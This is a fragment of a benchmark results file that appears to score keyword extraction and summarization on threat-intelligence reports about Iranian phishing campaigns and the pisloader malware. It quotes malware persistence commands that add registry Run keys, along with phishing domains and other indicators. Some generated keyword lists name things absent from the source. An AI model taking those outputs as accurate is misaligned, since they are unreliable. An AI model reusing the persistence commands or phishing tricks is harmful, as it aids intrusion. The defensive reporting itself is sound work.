researchers highlight the evolution of Kazuar over the years and how it has been continuously updated by its developers. The article emphasizes the importance of investigating these shared features to uncover more about Kazuar and the origins of Sunburst. Drawing parallels to past incidents like the WannaCry attack, the researchers stress the significance of connecting the dots through further research. The comparison of sleeping algorithms between Kazuar and Sunburst reveals similarities in their approach to delaying connections to a C2 server for stealth purposes. The article encourages global researchers to explore these similarities to gain more insights into the link between Sunburst and Kazuar, as well as the actors behind these attacks."]}, {"split_name": "test", "sample_id": "test_47", "prompt_text": "Extract the keywords: [PERSON] June2015Thamar [PERSON] ReservoirAn [PERSON] Iranian cyber - attack campaign against targets in the Middle EastClearskyTLP : WHITEFor public distribution _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [TIME] 1of [TIME] 18ContentsForeword [TIME] 3Modus operandi - investigation of targeted attacks [CARDINAL] 4Part 1 -spear phish # 1 - with malware [CARDINAL] 4Part 2 - phone calls to victims [CARDINAL] 5Part 3 - spear phishing # [MONEY] 2 5Part 4 - breaking into an [NORP] Israeli research institute to set up phising page # [MONEY] 3 [MONEY] 7Part [CARDINAL] 5 - spear phishing # [MONEY] 4 [MONEY] 9Part 6 - Abusing account recovery mechanisms 10Part 7 - Private messages 10Targets and further incidents [CARDINAL] 12Targets [CARDINAL] 12Further incidents [CARDINAL] 13The [NORP] Iranian connection [CARDINAL] 14Malware analysis 15Macro 15tmp.bat 16NTUSER.dat{GUID}.exe [CARDINAL] 16CWoolger Keylogger 16Technical indicators and [LAW] IoC [LAW] 18Domains 18IPs 18Malware 18Malicious Email accounts [CARDINAL] 18 _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 2 of [CARDINAL] 18ForewordThis report reviews an ongoing cyber - attack campaign dating back to [DATE] mid-2014 . Additional sources indicate this campaign may date as far back as [DATE] 2011 . We call this campaign [ORG] Thamar [ORG] Reservoir , named after [CARDINAL] one of the targets , [PERSON] Thamar [PERSON] E. [PERSON] Gindin1 , who exposed new information about the attack and is currently assisting with the investigation . The campaign includes several different attacks with the aim of taking over the target \u2019s computer or gain access to their email account . We estimate that this access is used for espionage or other nation - state interests , and not for monetary gain or hacktivism . In some cases , the victim is not the final target ; the attackers use the infected computer , email , or stolen credentials as a platform to further attack their intended target . The attackers are extremely persistent in their attempts to breach their targets . These attempts include:\uf0b7 Breaching trusted websites to set up fake [ORG] pages\uf0b7 [ORG] Multi - stage [ORG] malware\uf0b7 [ORG] Multiple spear phishing emails based on reconnaissance and information gathering.\uf0b7 Phone calls to the target.\uf0b7 Messages on social networks . While very successful in their attacks , the attackers are clearly not technically sophisticated . They are not new to hacking , but do make various mistakes , such as grammatical errors , exposure of attack infrastructure , easy to bypass anti analysis techniques , lack of code obfuscation , and more . These mistakes enabled us to learn about their infrastructure and methods . More importantly , we have learned of [CARDINAL] 550 targets , most of them in [LOC] the [LOC] Middle [LOC] East , from various fields : research about diplomacy , [LOC] Middle [LOC] East and [GPE] Iran , international relations , and other fields ; [ORG] Defense and security ; Journalism and human rights ; and more . Various characteristics of the attacks and their targets bring us to the conclusion that the threat actors are [NORP] Iranian . In addition , we note that these attacks share characteristics with previously documented activities:\uf0b7 [PERSON] Attacks conducted using the [PERSON] Gholee malware , which we discovered.\uf0b7 Attacks reported by [ORG] Trend [ORG] Micro in Operation Woolen - Goldfish.\uf0b7 Attacks conducted by [ORG] the [ORG] Ajax [ORG] Security [ORG] Team as documented by [ORG] FireEye.\uf0b7 [ORG] Attacks seen during [GPE] Newscaster as documented by [ORG] iSight . For further details and questions , or if you think you are a victim please contact us at : info [ at ] clearskysec.com1 Dr. [PERSON] Gindin is an expert on [NORP] Iranian linguistics and Pre [ORG] - Islamic [ORG] Iran , renowned lecturer and research fellow at [FAC] the [FAC] Ezri [FAC] Center for [GPE] Iran and [ORG] Persian [ORG] Gulf [ORG] Research in [ORG] the [ORG] University [ORG] of [ORG] Haifa . url [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 3 of [CARDINAL] 18Modus operandi - investigation of targeted attacksThis chapter contains an in - depth analysis of a series of attacks against [CARDINAL] one of [ORG] the [ORG] Thamar [ORG] Reservoir targets . The heavy attack began [DATE] two [DATE] days after the target , Dr. [PERSON] Thamar [PERSON] E. [PERSON] Gindin , was interviewed on the IDF radio station2.Over the course of [DATE] two [DATE] weeks , the threat actor used the following attacks against a single target:1 . [CARDINAL] One spear phishing email containing malware.2 . [CARDINAL] Three separate email messages with links to a fake log - in page , ( including [CARDINAL] two factor authentication),one of them hosted on a breached website , the other [CARDINAL] two on dedicated domains.3 . [CARDINAL] Two phone calls from the attacker , designed to build rapport for [CARDINAL] one of the phishing [DATE] emails.4 . Numerous attempts to take over cloud accounts using their [ORG] Account [ORG] Recovery [ORG] mechanism.5 . Numerous messages on Facebook and by e - mail . While we describe this case mostly from the point of view of a single target , we would like to emphasize that these scenarios repeated themselves for many other targets . Part [CARDINAL] 1 -spear phish # 1 - with malwareIn [DATE] May [DATE] 2015 a legitimate email was sent asking several researchers to fill out a form that was sent as a Word document . The attackers obtained this correspondence , presumably by breaching the email account of the sender . They created a new [PERSON] Gmail account with a username similar to that of the original sender . Then , they sent the recipients a follow - up message ( including the initial correspondence ) , asking them to fill up the attached form again . This time , the attachment was a weaponized [ORG] Microsoft [ORG] Excel file ( The file is analyzed in the \u201c [PERSON] Malware analysis \u201d chapter of this report).In other cases the attackers used the same methods - sending malware or phishing from a cloud email service ( such as [PERSON] Gmail or [GPE] Hotmail ) using a username similar to that used by one of the target \u2019s acquaintances . The malicious email was written in the original language of the correspondence - [LANGUAGE] Hebrew . But it is clear that the attackers do not know [LANGUAGE] Hebrew , as they made grammatical errors in the few words they have added to it ( the rest were copied from the original email ) . Other messages , in [LANGUAGE] English and [PERSON] Farsi , were analyzed by several specialists3and were determined to have been written by a native [NORP] Iranian [NORP] Persian speaker.2 The interview revolved around \u201c her own way to being a linguist and an [NORP] Iranist , and promoting her books \" The Good , the Bad and the World - a Journey to Pre - Islamic Iran \" and \" [WORK_OF_ART] The [WORK_OF_ART] Book [WORK_OF_ART] of Esther , [WORK_OF_ART] Unmasked \" \u201c .3Three of the targets are [GPE] Iran and the [LOC] Middle [LOC] East researchers , and [CARDINAL] two of them are native [ORG] Farsi speakers . Going through numerous messages they have received , and in [CARDINAL] one case a phone call - they have determined that the writer / speaker is native in [NORP] Iranian [NORP] Persian . _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 4 of 18Below is an example of another case ( the email includes the professional signature of the impersonated sender):Part [CARDINAL] 2 - phone calls to victimsA [DATE] week [DATE] later , the attackers called the target \u2019s office number . The office manager , who received the call , later said that someone with \u201c bad [LANGUAGE] English \u201d had asked to schedule an interview . The attackers later called the target \u2019s personal cell phone , and left a similar message with a callback number in [GPE] London . The attackers called the targets in other cases as well . For example , after breaching the password of a victim back in [DATE] November [DATE] 2014 , the attacker called , pretending to be the assistant of a professor abroad who wished to talk to the victim . After several \u201c unexplained \u201d cut - offs during the call , the attacker said they should switch to [ORG] Google [ORG] Hangout , asking for the \u201c conversation code \u201d the victim had just received to his cell phone . The code was actually the [ORDINAL] second factor authentication for the victim \u2019s Gmail account . As soon as he gave it away - the attackers took over his [PERSON] Gmail , Facebook and other accounts . Part [CARDINAL] 3 - spear phishing # 2That [QUANTITY] evening , the target received an email written in [PERSON] Farsi , coming from a spoofed [PERSON] persian@bbc.co.uk email address ( the real address of [ORG] BBC [ORG] Farsi ) . The message was a follow up on the call that morning , asking to schedule the interview for [DATE] the [DATE] next [DATE] day : _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 5 of 18The headers of the message indicate that it was spoofed , and was actually sent from a server in [GPE] Hungary , mail5.maxer.hu . The email contained a linked text , [ORG] Document.pdf , with this URL : url Auto / AutoSecond?Chk=<redacted>&sa = D&sntz=1&usg=<redacted > The URL is composed of [CARDINAL] two parts . The [ORDINAL] first part is a legitimate [ORG] Google.com address , with the q= parameter . The [ORDINAL] second part is the value of that parameter - a fake [FAC] Google [FAC] Drive log - in page in the attackers controlled domain - login-users.com . Upon clicking the link , the target is redirected to the address in the q= parameter . This is a trick the attackers use to mislead the target - making her think she is about to visit a legitimate Google website . The fake [FAC] Google [FAC] Drive log - in page was customized to the target ; her real username was already filled in : _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 6 of 18The [PERSON] Whois information for the domain is similar to those used in legitimate [ORG] Google owned domain , except for the \u2018 d \u2019 instead of \u2018 b \u2019 in the \u201c registrant - email \u201d value : gmail - aduse@google.com : The attacker sent [CARDINAL] three follow - up emails to make sure the target had received the [ORDINAL] first one , from the same server in [GPE] Hungary and with the Reply - To address saeed.kn2003@gmail.com . Part [CARDINAL] 4 - breaking into an [NORP] Israeli research institute to set up phising page # [MONEY] 3The next morning , several targets received an email inviting them to participate in an \" [EVENT] Iran [EVENT] Israel [EVENT] Forum \u201d of an [NORP] Israeli research institute . The email can be seen below ( sensitive information has been redacted):The headers of the email indicate that they the email was not spoofed , and had been sent from the research institute . As can be seen , the email contained various grammatical mistakes . Moreover , anyone who knows _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 7 of 18the institute would notice that parts of the message are inaccurate ( this will not be elaborated here in order not to expose the institute \u2019s identity).The words \u201c [WORK_OF_ART] Access [WORK_OF_ART] To [WORK_OF_ART] Forum \u201d linked to a page within the real , compromised , website of the institute . The page contained more information about the \u201c forum \u201d , and offered [CARDINAL] four \u201c sign in \u201d options , as can be seen in the screenshot below : Clicking [CARDINAL] one of the sign - in options led to a custom made log - in page , again , with the target \u2019s username , email , and picture already present : _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 8 of 18After submitting a password , the victim is taken to the next fake page in which she is asked to submit the [CARDINAL] two factor authentication code she has just received to her phone : Upon submission , the victim is redirected to a static \u201c registration confirmed \u201d page . Interestingly , the log file for the previous pages was hosted publicly on the same virtual folder . The log contained the false credentials the target submitted ( as she recognized this was a fake)4 : We reported the breach to the institue , and they investigated and cleaned it off . They informed us that their own servers were never breached . Rather , a server run by a researcher who was givenn a \u201c virtual folder \u201d within their domain was . This , of course , did not change the end result - the attackers managed to implant a fake page within the Instititue domain , and were able to send an email using the same domain . This pattern is recurring : The attackrs go after \u201c low hanging fruits \u201d in order to reach their goal rather than using advnaced techincal means . [DATE] Four [DATE] days [DATE] later , the target received the following email from the same fake address as in part [CARDINAL] 1 : Part [CARDINAL] 5 - spear phishing # [MONEY] 44 The \u201c pass \u201d filed intermingled with the [ORG] IP filed in the original log , file due to bidirectionality issues . _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 9 of 18The email contained the real textual signature of the sender , and the word [PERSON] Toda ( Thank you , in [LANGUAGE] Hebrew ) , as the sender usually writes . The hyperlink text in the message appeared to be leading to youtube.com , but in fact linked to a fake address that only looked like a [ORG] YouTube domain . The page contained a \u201c private [ORG] Youtube video \u201d , asking the viewer to sign in in order to watch it : After signing in , the page redirected to a specific interview in target \u2019s real [ORG] YouTube channel - proving once again that the attacks are targeted and based on reconnaissance . Part [CARDINAL] 6 - Abusing account recovery mechanismsDuring the writing of this article , the attackers continued to attempt to take over various accounts of the target . For example , they tried to fool Google into giving them access to the target \u2019s [PERSON] Gmail accounts using [LAW] the [LAW] Google [LAW] Account [LAW] Recovery [LAW] process5 ( a process which in certain cases enables one to regain access to an account even if the password and other means of authentication are unavailable).The attackers tried similar methods against the target \u2019s account on [WORK_OF_ART] Facebook [WORK_OF_ART] and [WORK_OF_ART] Yahoo , and had also set up a fake [ORG] Hotmail account , which was used as the secondary email to which the recovered password should be sent . Part 7 - Private messagesThe target has been contacted by various \u201c weird \u201d characters on Facebook and by e - mail . They have been asking her various questions that have nothing to do with her professional expertise and tried to contact her in various ways . The conversation are conducted in [NORP] Persian . We can not find a direct connection between these Facebook characters and the above mentioned attacks . However , in addition to them happening close to the attacks , we do know that [CARDINAL] at [CARDINAL] least [CARDINAL] one of the accounts is fake.5url [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 10 of 18One of the fake characters who has engaged in conversation , is using throughout her profile pictures of a [NORP] Russian model , and has presented herself as with different , contradicting , background stories in conversations with different targets . _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 11 of 18Targets and further incidentsTargetsSo far we have exposed a list of [CARDINAL] more [CARDINAL] than [CARDINAL] 500 targets by name and email . The targets come , mostly , from the following fields:\uf0b7 Both Academic researchers and practitioners in the fields of counter - terror , diplomacy , internationalrelations , [GPE] Iran and [LOC] Middle [LOC] East , and other fields , such as [ORG] Physics.\uf0b7 [ORG] Security and defence . \uf0b7 [CARDINAL] \uf0b7 Other similar fields . Journalists and Human rights activists . In some cases the attackers tried to breach the account of a relative or colleague of the real target . Below is the target distribution by country : _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 12 of [CARDINAL] 18Further incidentsWe have investigated and can publicly mention the following incident by the same threat actor:\uf0b7 A security company had numerous employees targeted with customized phishing pages . The attackers managed to infect computers within the company and steal information . In several other cases numerous employees from the same organization were targeted.\uf0b7 A fake [PERSON] Gmail account was set up using the name of the head of a research center . Following , severalof his contacts received targeted phishing email from the fake account.\uf0b7 A fake domain has been set up , imitating that of [ORG] the \u201c Interdisciplinary [ORG] Center [ORG] Herzliya \u201d , an [ORG] Israelicollege ( unrelated to the research institute described above ) , and has been used in attacks . The table below correlates between the threat actor behind the [ORG] Thamar [ORG] Reservoir campaign and the name of threat actor or campaign , as given in other reports : Threat actor / campaignCorrelationsGholee6 by [ORG] ClearskyOverlapping infrastructure and malware . [PERSON] Rocket [PERSON] Kitten7 , [ORG] Operation WOOLEN [ORG] - GOLDFISH by [ORG] TrendmicroOverlapping infrastructure and malware . [ORG] Ajax [ORG] Security [ORG] Team , [ORG] Operation [ORG] Saffron [ORG] Rose8 by FireEyeSimilar TTPs and interests - Attacks against universities and researchers ; Use of fake conference pages ; Use of a domain that spoofs the name of the targeted organization . CertaintyHighHighMediumNewscaster9 by iSightSimilar TTPs - pretending to be a reporter in order to get close to approach the victim . Medium6url 7url 8url 9url [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 13 of 18The [NORP] Iranian connectionSeveral characteristics of the attacks have led us to the conclusion that an [NORP] Iranian threat actor is the likely culprit . We assume , though do not have direct evidence , that it is being supported by the [NORP] Iranian regime , or performed by the [PERSON] Regime itself:\uf0b7 The context of the attacks and cover stories all revolve around [GPE] Iran . Importantly , as determined by several professionals - the attackers speak and write in [NORP] native [NORP] Iranian [NORP] Persian and make mistakes characteristic of [NORP] Persian speakers . In [CARDINAL] one of the hacked accounts , when retrieved , the interface language had been changed to Persian.\uf0b7 The targets and victims match the interests of [GPE] Iran . Moreover , rather than stealing money or performing high key \u201c cyber terror \u201d attacks ( such as information leaks or deferments ) , the attackers only steal information and use the access to computers for further attacks - indicating espionage , [ORG] IP theft , etc.\uf0b7 The TTPs match those of attackers and attacks that were attributed to [GPE] Iran by other securitycompanies , as mentioned in the previous chapter.\uf0b7 Some of the domains and IPs used by the attackers in the cases we investigated were mentioned and attributed to an \u201c [NORP] Iranian threat group \u201d in an advisory by [ORG] the [ORG] Financial [ORG] Sector [ORG] Cyber [ORG] Intelligence [ORG] Group , and [ORG] the [ORG] Department [ORG] of [ORG] the [ORG] Treasury , CIG Circular 351010url ad/208893/1786893 / file/20150311_WASP.pdf _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 14 of [CARDINAL] 18Malware analysisThe malicious [PRODUCT] Excel file ( mentioned in \u2018 Part [CARDINAL] 1 - speared email message containing malware \u2019 ) serve as a Dropper - it creates [CARDINAL] two files and runs them . When opening the excel file ( .xlsb ) , the user sees a blank sheet and the standard \" [PERSON] Macros have been disabled \u201d message . If enabled by the user , the macro drops NTUSER.dat{GUID}.exe and tmp.bat . The content of the excel sheet is then presented . It is case specific and customized to the victim . Different malware can be downloaded to the infected computer . On an infected computer we have analyzed , we found CWoolger Keylogger . The macro , [CARDINAL] two files , and [ORG] CWoolger are analyzed below . MacroThe [ORG] VBA macro is similar to that used to drop [PERSON] Gholee , as we reported [DATE] about [DATE] 8 [DATE] month ago11 . However , in current case , a simple downloader was used instead of [PERSON] Gholee . The [ORG] VBA contains a series of functions built of [ORG] VBA [ORG] Character [ORG] Codes : These are constructed into a single variable and then written as a file to disc , creating and running NTUSER.dat{GUID}.exeNext , tmp.bat is written and executed.11url [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 15 of 18tmp.batTmp . [PERSON] Bat contains [CARDINAL] two lines . The [ORDINAL] first create a registry key without prompting the user for permission , telling the computer to run [PERCENT] NTUSER.dat{GUID}.exefrom [PERCENT] % USERPROFILE% every time the computer starts , naming it \u201c My App \u201d . For example : [ORG] REG ADD \" HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \" /V \" My App \" /t REG_SZ /F /D sized [CARDINAL] 8.5 [PERSON] KB , and is recognized by [CARDINAL] 19 out of [CARDINAL] 57 antiviruses on [PERSON] Virus [PERSON] Total12 ( the sample was not submitted by us).It contains simple mechanisms to detect and prevent analysis , such as IsDebuggerPresent : The malware tries to download files form a remote address , apparently \u201c stage [CARDINAL] two \u201d , the actual malware . [ORG] CWoolger KeyloggerWe have not been able to get the final malware when running the malicious excel file and dropper in the lab , as the server was not responding . However , we have performed forensic analysis of the computer used by a target who opened the malicious [PRODUCT] Excel file . That computer was infected with [ORG] CWoolger keylogger . An analysis of this tool can be read in [ORG] Trendmicro \u2019s 13 url goldfish.pdf _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 16 [CARDINAL] of [CARDINAL] 18\uf0b7 The [ORG] CWoolger exe file was located in % appdata%\\microsoft\\windows\\templates\\wlg.exe\uf0b7 To gain persistency , a link to the exe file was placed in in the [PRODUCT] Startup folder , with the name\u201cWinDefender \u201d and the notepad icon.\uf0b7 A file containing the collected keystrokes is saved in % temp% in a file called wlg.dat . it is sent to anattacker controlled server [TIME] every [TIME] 15 [TIME] minutes . These findings are similar to those found by [PERSON] Trendmicro \u2013 indicating that the attackers have been using the same tool for [DATE] months . We would like to thank Omri moyal , VP Research at [PERSON] Minerva [PERSON] Labs for assisting the analysis . _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ [PERSON] \u00a9 [PERSON] Clearsky [PERSON] - [PERSON] Cyber security . clearskysec.comPage [CARDINAL] 17 of 18Technical indicators and IoCDomainsDomains hosting phishing pages : login - users[.]com drives - google[.]co qooqle[.]co video[.]qooqle[.]co drive - google[.]co gfimail[.]us Google - Setting[.]com Google - Verify[.]com", "generated_text": "PDF; Opera; Middle East; the attack; early 2014; Thamar Reservoir; the attackers; emails; information; Trojan; SMS; email accounts; phishing pages; attacks; access; stolen credentials; an Israeli research institute; phishing pages; email accounts; malicious email accounts; Trep; The campaign; information; the attackers; a variety; attacks; access; the targets; the attackers; phishing emails; website; emails; passwords; the attackers; activity; espionage; hacktivism; the Iranian connection; grammatical errors; IP; infrastructure; the campaign; details; technical indicators; IOCs; procedures; the Iranian link; YARA; Japanese; passwords; Cobalt Strike; the threat actors; awareness.", "ref_text": "<START-1>The report by cybersecurity company Clearsky analyzes an Iranian cyber espionage campaign dubbed Thamar Reservoir. The attackers targeted Middle Eastern organizations and individuals in fields like academia, security, journalism and human rights since at least 2014. The report profiles how the threat actors patiently and persistently tried to compromise a single target over 2 weeks using social engineering tactics like: - Spear phishing emails with weaponized documents - Spoofed emails purporting to be journalists - Phone calls to build rapport - Fake login pages on compromised sites - Abusing account recovery mechanisms The attacks aimed to infect targets' computers and steal credentials for surveillance and further attacks. While not technically sophisticated, the threat actors were very focused on their goals. Analysis ties the attacks to Iranian state-sponsored groups based on target profiles, personas, linguistics, and technical overlaps with previous campaigns like Operation Woolen-Goldfish. Attributed groups include Rocket Kitten and the Ajax Security Team. The report provides indicators of compromise like domains, IPs, email addresses, and malware samples used. It also makes recommendations on securing against such threats by protecting internet-facing assets, safeguarding credentials, and monitoring for unusual activity. Overall, the report reveals the cyber espionage operations and tactics, techniques and procedures of Iranian actors through an in-depth case study of one victim. It provides insight into how Iran pursues its geopolitical interests in cyberspace. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46, "gpt3/lexical/rouge_rouge2": 0.10552763819095479, "gpt3/lexical/rouge_rougeL": 0.20500000000000002, "gpt3/lexical/rouge_rougeLsum": 0.20500000000000002, "gpt3_generated_text": ["The article discusses an ongoing cyber-attack campaign known as Thamar Reservoir, which began in early 2014 and primarily targets individuals and organizations in the Middle East. The attackers use a variety of techniques, including spear phishing emails, phone calls, and fake websites, to gain access to their victims' computers and email accounts. The goal of the campaign is believed to be espionage or other nation-state interests, rather than financial gain or hacktivism. The attackers are persistent but not technically sophisticated, making mistakes that have allowed researchers to learn about their infrastructure and methods. The attacks have targeted a wide range of individuals and organizations, including those involved in diplomacy, defense and security, journalism, and human rights. The article concludes that the threat actors are Iranian, based on the characteristics of the attacks and their similarities to previously documented Iranian cyber-attacks. The article provides technical details and indicators of compromise (IOCs) for those who may have been targeted, and urges individuals to contact the researchers if they believe they have been victims of the campaign."]}, {"split_name": "test", "sample_id": "test_48", "prompt_text": "Extract the keywords: 8POSTED BY : [PERSON] Josh [PERSON] Grunzweig , [PERSON] Mike [PERSON] Scott and [PERSON] Bryan [PERSON] Lee on [DATE] May 24 , [DATE] 2016 [DATE] 11:30 AMFILED IN : Malware , Threat Prevention , Unit 42 TAGGED : command and control , [ORG] DNS , pisloader , [ORG] WekbyWe have observed an attack led by the [ORG] APT group [ORG] Wekby targeting a [GPE] US - based organization in [DATE] recent [DATE] weeks . [ORG] Wekby is a group that has been active for [DATE] a [DATE] number [DATE] of [DATE] years , targeting various industries such as healthcare , telecommunications , aerospace , defense , and high tech . The group is known to leverage recently released exploits very shortly after those exploits are available , such as in the case of HackingTeam \u2019s Flash zero - day exploit . The malware used by the [ORG] Wekby group has ties to the [ORG] HTTPBrowser malware family , and uses [ORG] DNS requests as a command and control mechanism . Additionally , it uses various obfuscation techniques to thwart researchers during analysis . Based on metadata seen in the discussed samples , [ORG] Palo [ORG] Alto [ORG] Networks has named this malware family \u2018 pisloader\u2019 . Get Updates Sign up to receive the latest news , cyber threat intelligence and research from Unit 42.Business EmailSubmitThe pisloader malware family was delivered via HTTP from the following URL . At the time of writing , this URL was still active.url samples hosted on this domain include the following : url E4968C8060EA017B5E5756C16B80B012 Size : [DATE] 126976 Bytes [PERSON] Compile [PERSON] Time : [DATE] 2016 - 04 - 28 00:38:46 UTCThis discovered file was found to be an instance of the common [ORG] Poison Ivy malware family with the following configuration data : [ORG] Command and Control Address : intranetwabcam[.]com Command and [ORG] Control [ORG] Port : [CARDINAL] 80 Password : admin Mutex : ) ! VoqA.I5The domains witnessed in this attack were all registered very shortly prior to being used . The following domains have been witnessed in this attack : Additionally , the following [ORG] IP resolutions have been observed . The following sample was discovered initially and is referenced in the subsequent analysis : MD5 : E8D58AA76DD97536AC225949A2767E05 SHA256 : DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1 Size : [DATE] 126976 Bytes [PERSON] Compile [PERSON] Time : [DATE] 2016 - 04 - 27 14:37:34 UTCThis particular file has the following metadata properties . The references to \u2018 pisload2 \u2019 led to the naming of this malware family . Select a [ORG] CategorySelect a MonthMORE \u2192Prevention : Changing the Math of Cybersecurity Through Automated Defense posted by [PERSON] Ryan [PERSON] Gillis on [DATE] July [DATE] 4 , [DATE] 2016 [ORG] Palo [ORG] Alto [ORG] Networks [ORG] News [ORG] of the Week \u2013 [DATE] July [DATE] 2 , [DATE] 2016 posted by [PERSON] Anna [PERSON] Lough on [DATE] July [DATE] 2 , [DATE] 2016 Channel Scoop \u2013 [DATE] July [DATE] 1 , [DATE] 2016 posted by [ORG] Lang [ORG] Tibbils on [DATE] July [DATE] 1 , [DATE] 2016 Here \u2019s a Look at [FAC] the [FAC] First [FAC] Palo [FAC] Alto [FAC] Networks [FAC] Intern [FAC] Tech Week ! posted by [ORG] Courtney [ORG] Taku on [DATE] July [DATE] 1 , [DATE] 2016 Recent MNKit Exploit Activity Reveals Some [PERSON] Common [PERSON] Threads posted by [PERSON] Anthony [PERSON] Kasza on [DATE] June [DATE] 30 , [CARDINAL] 2016MORE \u2192Figure [CARDINAL] 1 pisloader dropper metadataThe initial dropper contains very simple code that is responsible for setting persistence via the [PERSON] Run registry key , and dropping and executing an embedded [PRODUCT] Windows executable . Limited obfuscation was encountered , where the authors split up strings into smaller sub - strings and used \u2018 strcpy \u2019 and \u2018 strcat \u2019 calls to re - build them prior to use . They also used this same technique to generate garbage strings that are never used . This is likely to deter detection and analysis of the sample . The following decompiled code demonstrates this . Comments have been added to show the fully - generated strings . Figure [CARDINAL] 2 pisloader dropper building strings and setting persistenceIn the above decompiled code , we see that the pisloader is generating the following string , which eventually is called to set the [PERSON] Run registry key.cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 